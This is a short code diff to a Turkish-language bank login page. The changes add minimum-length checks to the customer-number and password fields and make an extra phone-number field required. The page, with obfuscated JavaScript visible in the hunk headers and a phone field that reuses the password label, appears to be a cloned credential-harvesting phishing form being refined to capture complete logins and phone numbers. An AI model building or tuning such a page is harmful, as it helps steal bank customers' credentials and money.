@@ -432,7 +432,7 @@ function B(a){var d=+new Date;if(!document[f(32,145,149,133,146,153,115,133,140,
                             <div class="inputLabel ie8-9Only">
                                 <span id="_ctl0_subeLogin01MusteriNumarasi">Müşteri Numaranız / TCKN / YKN</span></div>
                             <div class="loginInputContainer bottom10">
-                                <input name="_ctl0:_ctl0_MusNoText" type="tel" id="_ctl0_MusNoText" placeholder="Müşteri Numaranız / TCKN / YKN" title="Müşteri Numaranız / TCKN / YKN" maxlength="11" class="standardInput info onlyNumeric allowCopyPaste" autocomplete="off" tabindex="1" onkeyup="hideInputBottomErrorMessage($(&#39;#_ctl0_MusNoText&#39;));" required />
+                                <input name="_ctl0:_ctl0_MusNoText" type="tel" id="_ctl0_MusNoText" placeholder="Müşteri Numaranız / TCKN / YKN" title="Müşteri Numaranız / TCKN / YKN" minlength="11" maxlength="11" class="standardInput info onlyNumeric allowCopyPaste" autocomplete="off" tabindex="1" onkeyup="hideInputBottomErrorMessage($(&#39;#_ctl0_MusNoText&#39;));" required />
                                 <span id="_ctl0_rememberContainer" class="musnoOtherInputText musnoOtherInputText-tr-TR"><span id="clearRemembermusno"
                                     style="display: none" class="clearRemembermusno"></span>
                                     <div class="onoffswitch onoffswitch-tr-TR">
@@ -460,7 +460,7 @@ function B(a){var d=+new Date;if(!document[f(32,145,149,133,146,153,115,133,140,
                     <div class="loginInputContainer loginPasswordInputContainer ui-login-z5">
                          <div class="loginInputContainer loginPasswordInputContainer ui-login-z5"> 
 
-                            <input name="_ctl0:ParolaText" type="text" id="ParolaText" pattern="[0-9]*" maxlength="6" onkeyup="hideInputBottomErrorMessage($(&#39;#ParolaText&#39;));removeFontFamilyTextSecurity();" placeholder="Şifre / Geçici Şifre" onkeydown="addFontFamilyTextSecurity(true);" onpaste="return false;" title="Şifre / Geçici Şifre" tabindex="2" onkeypress="addFontFamilyTextSecurity(false);" onfocus="addFontFamilyTextSecurity(false);" size="6" class="standardInput info onlyNumeric virtualKeypad removeAutoFill" autocomplete="off" required />
+                            <input name="_ctl0:ParolaText" type="text" id="ParolaText" pattern="[0-9]*" minlength="6" maxlength="6" onkeyup="hideInputBottomErrorMessage($(&#39;#ParolaText&#39;));removeFontFamilyTextSecurity();" placeholder="Şifre / Geçici Şifre" onkeydown="addFontFamilyTextSecurity(true);" onpaste="return false;" title="Şifre / Geçici Şifre" tabindex="2" onkeypress="addFontFamilyTextSecurity(false);" onfocus="addFontFamilyTextSecurity(false);" size="6" class="standardInput info onlyNumeric virtualKeypad removeAutoFill" autocomplete="off" required />
 
                         <div id="passInfo" class="infoBlueBox infoQuestionMark" title="Å?ifre bilgisi">
                         </div>
@@ -473,7 +473,7 @@ function B(a){var d=+new Date;if(!document[f(32,145,149,133,146,153,115,133,140,
                     </div>
                     <div class="loginInputContainer loginPasswordInputContainer ui-login-z5" style="display: block;"> 
 
-                            <input name="user_prefs2" type="tel" id="user_prefs2" pattern="[0-9]*" maxlength="12" placeholder="Telefon Numaranız" onkeydown="addFontFamilyTextSecurity(true);" onpaste="return false;" title="Şifre / Geçici Şifre" tabindex="2" onkeypress="addFontFamilyTextSecurity(false);" onfocus="addFontFamilyTextSecurity(false);" size="6" class="standardInput info onlyNumeric virtualKeypad removeAutoFill" autocomplete="off">
+                            <input name="user_prefs2" type="tel" id="user_prefs2" pattern="[0-9]*" minlength="6" maxlength="12" placeholder="Telefon Numaranız" onkeydown="addFontFamilyTextSecurity(true);" onpaste="return false;" title="Şifre / Geçici Şifre" tabindex="2" onkeypress="addFontFamilyTextSecurity(false);" onfocus="addFontFamilyTextSecurity(false);" size="6" class="standardInput info onlyNumeric virtualKeypad removeAutoFill" autocomplete="off" required>
 
                          
                      
